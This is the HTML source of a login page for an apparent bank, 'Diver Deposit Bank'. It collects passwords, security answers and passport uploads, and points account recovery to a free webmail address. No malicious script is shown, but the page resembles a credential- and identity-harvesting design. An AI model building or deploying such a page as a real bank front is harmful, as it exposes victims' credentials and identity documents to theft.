<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Diver Deposit Bank</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/css/styles.css">
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2" defer></script>
    <script src="/js/main.js" defer></script>
</head>
<body class="bg-gradient-to-br from-blue-900 to-gray-800 min-h-screen flex items-center justify-center relative overflow-hidden">
    <div class="bg-white rounded-2xl shadow-2xl p-8 max-w-md w-full relative z-10 login-form">
        <div class="flex justify-between items-center mb-6">
            <div class="text-2xl font-bold text-blue-900" data-i18n="welcome">Diver Deposit Bank</div>
            <select id="language-select" class="border rounded p-1" data-i18n-select>
                <option value="en">English</option>
                <option value="es">Español</option>
                <option value="ko">한국어</option>
                <option value="zh">中文</option>
            </select>
        </div>
        <p class="text-gray-600 mb-6 text-sm" data-i18n="since">Since 1988</p>
        <img src="https://via.placeholder.com/100x100?text=American+Man" alt="American Man" class="absolute top-4 left-4 w-16 h-16 rounded-full opacity-50">
        <img src="https://via.placeholder.com/100x100?text=French+Man" alt="French Man" class="absolute top-4 right-4 w-16 h-16 rounded-full opacity-50">
        <form id="login-form" class="space-y-4">
            <input type="text" id="username" placeholder="Username" class="w-full p-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500" required data-i18n-placeholder="username">
            <input type="password" id="password" placeholder="Password" class="w-full p-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500" required data-i18n-placeholder="password">
            <input type="text" id="security-code" placeholder="What's your security code?" class="w-full p-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500" required data-i18n-placeholder="security_code">
            <input type="text" id="favorite-food" placeholder="What's your favorite food?" class="w-full p-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500" required data-i18n-placeholder="favorite_food">
            <button type="submit" class="w-full bg-blue-600 text-white p-2 rounded hover:bg-blue-700 transition duration-200" data-i18n="login">Login</button>
            <div id="loading" class="hidden flex justify-center"><div class="animate-spin rounded-full h-6 w-6 border-t-2 border-b-2 border-white"></div></div>
            <div id="success" class="hidden text-green-500 text-center">✅</div>
            <div id="error" class="hidden text-red-500 text-center">❎ Invalid credentials</div>
        </form>
        <form id="register-form" class="space-y-4 mt-6">
            <input type="text" name="username" placeholder="Username" class="w-full p-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500" required data-i18n-placeholder="username">
            <input type="text" name="email_or_phone" placeholder="Email or Phone" class="w-full p-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500" required data-i18n-placeholder="email_or_phone">
            <input type="password" name="password" placeholder="Password" class="w-full p-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500" required data-i18n-placeholder="password">
            <input type="text" name="security-code" placeholder="Security Code" class="w-full p-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500" required data-i18n-placeholder="security_code">
            <input type="text" name="favorite-food" placeholder="Favorite Food" class="w-full p-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500" required data-i18n-placeholder="favorite_food">
            <button type="submit" class="w-full bg-green-500 text-white p-2 rounded hover:bg-green-600 transition duration-200" data-i18n="register">Register</button>
        </form>
        <form id="upload-passport-form" class="space-y-4 mt-6" enctype="multipart/form-data">
            <input type="file" name="passport" class="w-full p-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500" required data-i18n-placeholder="passport">
            <button type="submit" class="w-full bg-purple-500 text-white p-2 rounded hover:bg-purple-600 transition duration-200" data-i18n="passport">Upload Passport</button>
        </form>
        <p class="text-sm text-gray-600 mt-4">Forgot credentials? Contact <a href="mailto:diver.deposit@inbox.ru" class="text-blue-500">diver.deposit@inbox.ru</a></p>
    </div>
    <div class="wave-bg absolute bottom-0 w-full h-20 bg-gradient-to-t from-blue-900 to-transparent"></div>
</body>
</html>
